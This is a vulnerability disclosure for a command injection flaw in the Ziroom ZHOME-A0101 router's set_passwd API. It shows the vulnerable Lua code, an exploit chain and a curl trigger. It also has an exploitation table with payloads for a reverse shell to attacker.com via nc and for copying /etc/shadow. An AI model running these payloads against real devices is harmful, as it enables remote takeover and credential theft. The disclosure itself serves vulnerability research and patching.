# Command Injection Vulnerability in ZHOME ZH-A0101 set_passwd via `password1`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRnetwork/set_passwd`
- **Affected Parameter:** `password1`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                         |
| ------------------- | ---------------------------------------------- |
| File                | `usr/lib/lua/luci/model/ZRapi/ZRLanWanFun.lua` |
| Function            | `set_passwd()`                                 |
| Code Location       | line 869-888                                   |
| Injection Location  | line 877                                       |
| Endpoint            | `POST /api/ZRnetwork/set_passwd`               |
| Injection Parameter | `password1`                                    |
| Authentication      | HTTP Basic Auth (`root`)                       |

## Vulnerable Code
<img width="1065" height="743" alt="image" src="https://github.com/user-attachments/assets/63d7336e-683d-432f-aef5-9675fff01589" />
<img width="1092" height="378" alt="image" src="https://github.com/user-attachments/assets/f4fa4895-ef20-4aea-a567-1ef1eb351430" />

```lua
-- ZRLanWanFun.lua line 869-878
function set_passwd(setpasswd)
    local lucisys = require("luci.sys")
    local LuciUtil = require("luci.util")
    local fs = require "nixio.fs"
    local result = 0
    local username = "root"

    result = lucisys.user.setpasswd(username, tostring(setpasswd))

    os.execute("uci set system.@system[0].username=" .. username)
    os.execute("uci set system.@system[0].password=" .. tostring(setpasswd))
    os.execute("uci commit system")
end
```


```lua
-- zrNetwork.lua line 471-481
function set_passwd()
    local result = {}
    local LuciHttp = require("luci.http")
    local ZRWan = require("luci.model.ZRapi.ZRLanWanFun")
    local password1 = LuciHttp.formvalue("password1") or ""
    ZRWan.set_passwd(password1)
    result["code"] = 0
    luci.http.prepare_content("application/json")
    luci.http.write_json(result)
end
```

The controller reads `password1` from the HTTP request and passes it to `ZRWan.set_passwd()`. The model then concatenates the password into a UCI shell command and executes it through `os.execute()`.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |
 |-- Step 2: Send an authenticated POST request.
 |           URL:
 |           http://192.168.18.1/cgi-bin/luci/;stok=<STOK>/api/ZRnetwork/set_passwd
 |           Body:
 |           password1=<PAYLOAD>
 |
 |-- Step 3: Inject through the password1 parameter.
 |           Normal value:
 |           password1=admin
 |
 |           Injected value:
 |           password1=admin;touch /tmp/vuln07.txt
 |
 |           Execution flow:
 |           lucisys.user.setpasswd("root", "admin;touch /tmp/vuln07.txt")
 |           os.execute("uci set system.@system[0].password=admin;touch /tmp/vuln07.txt")
 |
 |-- Step 4: /bin/sh executes both commands.
 |           Command 1: uci set system.@system[0].password=admin
 |           Command 2: touch /tmp/vuln07.txt
 |
 `-- Step 5: Side effect.
             The system password may be changed to the full injected string.
```

## Trigger Request

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "password1=admin;touch /tmp/vuln07.txt" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_passwd"
```

## Verification

```bash
ssh -p 1022 root@192.168.18.1 \
  -o "PreferredAuthentications=password" \
  -o "PubkeyAuthentication=no" \
  "ls -la /tmp/vuln07.txt"
```

If the password was changed to the full payload, use this new password when logging in:

```text
admin;touch /tmp/vuln07.txt
```
<img width="2019" height="228" alt="image" src="https://github.com/user-attachments/assets/78f88c17-ec29-4008-bf1b-5a48e4cac0e7" />



## Password Recovery

After successful verification, log in with the current password and restore the expected password:

```bash
ssh -p 1022 root@192.168.18.1 "passwd -a md5 root << 'EOF'
admin
admin
EOF"
```

## Exploitation Scenarios

| Scenario                | Payload                                                      | Side Effect                                 |
| ----------------------- | ------------------------------------------------------------ | ------------------------------------------- |
| Create file             | `admin;touch /tmp/test`                                      | Password may become a string containing `;` |
| Reverse shell           | `admin;nc attacker.com 4444 -e /bin/sh`                      | Same as above                               |
| Information collection  | `admin;cat /etc/shadow>/tmp/shadow.txt`                      | Same as above                               |
| Reduced side-effect RCE | `admin;id>/tmp/id.txt;echo admin\|passwd --stdin root 2>/dev/null` | Attempts to restore password                |




